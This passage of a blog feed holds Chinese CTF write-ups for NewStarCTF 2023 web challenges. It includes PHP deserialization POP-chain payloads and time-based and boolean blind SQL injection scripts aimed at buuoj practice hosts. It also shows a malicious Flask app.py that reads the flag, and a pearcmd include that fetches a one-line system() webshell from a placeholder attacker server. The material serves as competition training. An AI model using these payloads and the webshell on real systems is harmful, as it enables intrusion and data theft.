class="hljs-string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\&quot;;s:3:\&quot;cmd\&quot;;s:4:\&quot;cat /flag\&quot;;&#125;&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:88:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>开容器看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br></code></pre></td></tr></table></figure><p>看起来像是一个php的<code>__destruct</code>反序列化利用，但是注意到结尾处出现<code>throw new Exception(&quot;Nope&quot;);</code>强制跑出异常进入到<code>gc</code>垃圾回收模式。因此，我们需要在反序列化处触发异常提前进入垃圾回收模式，其中，触发异常的情况常见有几种：</p><ul><li>对象被<code>unset()</code>处理时，可以触发。</li><li>数组对象为NULL时，可以触发。</li><li>当输入的序列化对象格式不完整或不正确时，可以触发。</li></ul><p>这里采用第三种方式绕过（当然，别的方式也可以正常绕过）</p><p>给出payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>)) &#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;errMsg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$a</span>-&gt;errMsg-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>得到的payload结尾删去一个反大括号即可。</p><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p>打开容器看到sql源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;select name, price from items where id = &quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;id&quot;</span>];<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>测试一下，发现是数字注入但是没有回显，还禁用了几个字符。</p><p>使用延时注入方法，写个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;</span><br>url1=<span class="hljs-string">&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28table_schema%29%2F**%2Ffrom%2F**%2Finformation_schema.tables%2F**%2Fwhere%2F**%2Ftable_name%2F**%2Flike%2F**%2F%27items%27%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;</span><br>url1=<span class="hljs-string">&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28schema_name%29%2F**%2Ffrom%2F**%2Finformation_schema.schemata%2F**%2F%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>url1=<span class="hljs-string">&#x27;http://f510f1ff-a866-49a0-81ac-821cf0393322.node4.buuoj.cn:81/?id=1%2f**%2fand%2f**%2fif%28ascii%28substr%28%28select%2f**%2fgroup_concat%28name%29%2F**%2Ffrom%2F**%2Fctf.items%29%2C&#123;&#125;%2C1%29%29&lt;&gt;&#123;&#125;%2C0%2Csleep%285%29%29&#x27;</span><br><br>temp_url=url1.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>re=requests.get(temp_url)<br><span class="hljs-built_in">print</span>(re.text)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-comment"># print(i)</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        temp_url=url1.<span class="hljs-built_in">format</span>(i,j)<br>        <span class="hljs-keyword">try</span>:<br>            re=requests.get(temp_url,timeout=<span class="hljs-number">3</span>)<br>            <span class="hljs-comment">#print(j)</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,flag)<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>打开容器，看到上传界面，上传一个空内容，发现python flask框架的debug模式没关，想到debug模式的热加载特性，直接上传一个app.py，加一个读flag的路由即可。</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> crypt <span class="hljs-keyword">import</span> methods<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,send_file<br><span class="hljs-keyword">import</span> os,datetime<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;Welcome to my flask disk&lt;/h1&gt;&lt;a href=&quot;/list&quot;&gt;list files&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/upload&quot;&gt;upload files&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/console&quot;&gt;admin manage&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>():<br>    dirs = os.listdir(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    items = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>        <span class="hljs-keyword">if</span> os.path.isfile(<span class="hljs-built_in">dir</span>):<br>            create_time = <span class="hljs-built_in">int</span>(os.path.getctime(<span class="hljs-built_in">dir</span>))<br>            create_time = datetime.datetime.fromtimestamp(create_time)<br>            item =<span class="hljs-string">f&#x27;&lt;/pre&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">dir</span>&#125;</span>  <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.path.getsize(<span class="hljs-built_in">dir</span>))&#125;</span>b  <span class="hljs-subst">&#123;create_time&#125;</span>&lt;/pre&gt;&lt;br&gt;&lt;br&gt;&#x27;</span><br>            items += item<br>            items += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">return</span> items<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aa&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aa</span>():<br>    os.system(<span class="hljs-string">&#x27;cat /flag &gt; /app/1.txt&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;os.system(a)&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        s=<span class="hljs-string">&#x27;&lt;form action=&quot;/upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;&#x27;</span><br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> file.filename <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> file.filename:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.. and / are not allowed!&#x27;</span><br>        <br>        file.save(file.filename)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;upload success. &lt;a href=&quot;/list&quot;&gt;check&lt;/a&gt;&#x27;</span><br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename <span class="hljs-keyword">and</span> os.path.exists(filename):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> filename:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.. and / are not allowed!&#x27;</span><br>        <span class="hljs-keyword">return</span> send_file(filename,as_attachment=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no file to download or file not exist&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="hljs-literal">True</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>难起来了，开始坐牢了。。。</p><p>贴个wp：<a href="https://shimo.im/docs/gXqmdVvbOEsXpo3o/read">https://shimo.im/docs/gXqmdVvbOEsXpo3o/read</a></p><p>顺便把第五周的也贴上了：<a href="https://shimo.im/docs/R3sGgZdrlyE6nL8T/read">https://shimo.im/docs/R3sGgZdrlyE6nL8T/read</a></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023-WEEK3 Web WriteUp</title>
    <link href="/2023/10/17/2023newstarctfWeek3/"/>
    <url>/2023/10/17/2023newstarctfWeek3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>解题 5&#x2F;6</p><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><p>打开容器，提示phpinfo</p><p>进入phpinfo.php查看php配置，发现register_argc_argv配置被打开，index.php内部有一个后缀名为.php的文件包含，通过pearcmd来包含进行恶意文件的下载，在vps上构造恶意文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php system($_GET[0]);&#x27;</span>;<br></code></pre></td></tr></table></figure><p>使用pearcmd包含：<code>?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</code></p><p>进入tmp&#x2F;pear&#x2F;download&#x2F;evil.php直接命令执行即可。</p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>跟Week2差不多，但是把union的大小写禁用了，用不了联合注入，使用布尔注入</p><p>贴个布尔注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>url=<span class="hljs-string">&#x27;http://4bbc4bf0-4b86-4dc7-90db-8609acab2c76.node4.buuoj.cn:81/?id=TMP0919\&#x27;And if(suBstring((seLect flag from ctf.here_is_flag liMit%201),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)--+&#x27;</span><br><br>all_chars = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-string">&quot;&#123;&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;-&quot;</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> all_chars:<br>        ppp=url.<span class="hljs-built_in">format</span>(i, j)<br>        re=requests.get(ppp)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(re.text)&gt;<span class="hljs-number">450</span>:<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: &quot;</span>, flag)<br></code></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>打开容器，是php反序列化</p><p>POP链：<code>Begin-&gt;name-&gt;__destruct()-&gt;Then-&gt;func-&gt;__toString()-&gt;Super-&gt;obj-&gt;invoke()-&gt;Handle-&gt;obj-&gt;__call-&gt;CTF-&gt;handle-&gt;end()-&gt;WhiteGod-&gt;__unset()</code></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 